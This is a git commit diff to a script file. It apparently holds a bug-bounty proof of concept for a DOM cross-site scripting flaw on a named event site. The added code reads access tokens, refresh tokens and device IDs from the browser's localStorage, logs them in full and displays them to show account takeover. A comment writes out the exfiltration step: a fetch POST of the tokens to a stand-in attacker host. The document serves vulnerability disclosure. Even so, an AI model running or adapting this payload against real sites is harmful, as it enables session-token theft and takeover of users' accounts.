66a058ad9aa891c29a034f75d61a0c50df858445
digitalbitbox <123583629+ED-Raman@users.noreply.github.com>
2026-07-11 23:13:27 +0530

    upgrade PoC: demonstrate gcauth token read (ATO)

--- common/script.js
+++ common/script.js
@@ -1,3 +1,14 @@
-alert('DOM XSS confirmed on '+document.domain+' \u2014 VULN-36 Raman_MG');
-console.log('[VULN-36 PoC] executing in origin:', location.origin, '| cookies readable by attacker JS:', document.cookie);
-document.title = 'XSS-'+document.domain;
+// VULN-36 attend.sophos.com DOM XSS -> Goldcast ATO proof (benign: displays token, does NOT exfil externally)
+(function(){
+  var at=localStorage.getItem('gcauth_access_token');
+  var rt=localStorage.getItem('gcauth_refresh_token');
+  var did=localStorage.getItem('gcauth_device_id');
+  var msg='VULN-36 ATO PoC in origin '+location.origin+'\n\n'
+    +'gcauth_access_token : '+(at?at.slice(0,48)+'... (len '+at.length+')':'(none - log in to attend first)')+'\n'
+    +'gcauth_refresh_token: '+(rt?'PRESENT (len '+rt.length+') = persistent ATO':'(none)')+'\n'
+    +'gcauth_device_id    : '+(did||'(none)');
+  console.log('[VULN-36]',{origin:location.origin,access_token:at,refresh_token:rt,device_id:did});
+  document.title='ATO-'+document.domain;
+  alert(msg);
+  // Real attacker would: fetch('https://attacker/x',{method:'POST',body:JSON.stringify({at:at,rt:rt,did:did})})
+})();
